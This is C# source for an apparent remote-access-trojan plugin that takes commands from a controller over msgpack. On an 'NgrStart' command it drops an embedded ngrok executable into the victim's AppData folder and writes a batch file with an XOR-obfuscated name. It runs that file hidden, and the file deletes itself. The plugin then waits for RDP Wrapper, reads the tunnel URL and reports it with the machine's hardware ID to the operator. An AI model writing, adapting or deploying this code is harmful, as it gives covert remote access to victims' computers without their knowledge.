using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using Plugin.Properties;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "NgrStart":
                        {
                            frok(unpack_msgpack.ForcePathObject("token").AsString, unpack_msgpack.ForcePathObject("port").AsString, unpack_msgpack.ForcePathObject("proto").AsString);
                            //new HandlehVNC().Start(unpack_msgpack.ForcePathObject("port").AsString);
                            break;
                        }
                    case "NgrStop":
                        {
                            //new HandlehVNC().Stop();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }


        public static void frok(string token,string port,string proto)
        {
            try
            {
                
                int timeOut = 5000;
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
                string pathofhelmet = Path.Combine(path, "PEGASUS");
                string rdpinstallpath = Path.Combine(pathofhelmet, "PEGASUSngrok.exe");
                Byte[] ngroksbytes = Resources.ngrok;
                if (!Directory.Exists(pathofhelmet))
                {
                    Directory.CreateDirectory(pathofhelmet);
                }
                File.WriteAllBytes(rdpinstallpath, ngroksbytes);

                string helmetpath = Path.Combine(pathofhelmet, "PEGASUSngrok.exe");
                string helmetlog = Path.Combine(pathofhelmet, "proclog.txt");
                System.IO.StreamWriter file = new System.IO.StreamWriter(Path.Combine(pathofhelmet, BCutEncrypt("mxea$hk~")));
                file.WriteLine("set logFile=" + helmetlog + "");
                file.WriteLine("set exeFile=" + helmetpath + "");
                file.WriteLine("%exeFile% authtoken " + token);
                file.WriteLine("%exeFile% " +proto +" " + port + " > %logFile%");
                //file.WriteLine("del %exeFile%");
                file.WriteLine("del \"%~f0\" & exit");
                file.Close();
                string frogc = Path.Combine(pathofhelmet, BCutEncrypt("mxea$hk~"));
                Process.Start(new ProcessStartInfo
                {
                    FileName = frogc,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    ErrorDialog = false,
                });
                Packet.Log("Ngrok Start Successfully!");
                //Omega.Start(token);
                //Grok.StartGrok(token,port,proto);
            }
            catch (Exception)
            {
                //return string.Empty;
            }


        }
        public static void SendUrl()
        {
            while (!Directory.Exists(@"C:\Program Files\RDP Wrapper"))
            {

            }
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
            string pathofrdp = Path.Combine(path, "PEGASUS");
            string patchoffile = Path.Combine(pathofrdp, "tunnel.txt");
            File.WriteAllText(patchoffile, PublicUrl());
            string cont = File.ReadAllText(patchoffile);


            while (!PublicUrl().Contains("tcp"))
            {

            }
            Connection.Send(InformationList());
        }
        public static byte[] InformationList()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Login";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("login").AsString = PublicUrl();
            return msgpack.Encode2Bytes();
        }
        public static string PublicUrl()
        {
            string vncinfo = string.Empty;
            string vnc = vncinfo;
            try
            {

                WebClient client = new WebClient();
                using (Stream data = client.OpenRead(@"http://127.0.0.1:4040/api/tunnels"))
                {
                    using (StreamReader reader = new StreamReader(data))
                    {
                        string content = reader.ReadToEnd();
                        string pattern = @"((tcp?|http?|tcp|http):((//)|(\\\\))+[\w\d:#@%/;$()~_?\+-=\\\.&]*)";
                        MatchCollection matches = Regex.Matches(content, pattern);
                        foreach (Match match in matches)
                        {
                            //vncinfo = Convert.ToString(match);
                            string toBeSearched = "tcp://";
                            string vnci = Convert.ToString(match);
                            vncinfo = vnci.Substring(vnci.IndexOf(toBeSearched) + toBeSearched.Length);
                        }
                        foreach (Match match in matches)
                        {
                            //vncinfo = Convert.ToString(match);
                            string toBeSearched = "http://";
                            string vnci = Convert.ToString(match);
                            vncinfo = vnci.Substring(vnci.IndexOf(toBeSearched) + toBeSearched.Length);
                        }

                    }
                }
                return (!string.IsNullOrEmpty(vncinfo)) ? vncinfo : "N/A";
            }
            catch
            {
            }


            return vnc;
        }
        public static void Log(string message)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static string BCutEncrypt(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ (uint)ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}